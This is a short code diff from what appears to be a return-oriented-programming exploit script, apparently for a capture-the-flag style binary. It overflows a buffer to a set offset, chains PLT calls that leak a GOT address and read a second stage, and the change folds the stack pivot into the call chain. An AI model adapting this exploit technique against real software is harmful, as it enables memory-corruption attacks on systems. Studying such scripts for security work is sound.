@@ -11,8 +11,7 @@ buf = rop.fill(offset)
 buf += rop.call_chain_plt(
     ['write', 1, rop.got()+8, 8],
     ['read', 0, addr_stage, 600]
-)
-buf += rop.pivot(addr_stage)
+, pivot=addr_stage)
 
 p = Proc(rop.fpath)
 p.write(p32(len(buf)) + buf)
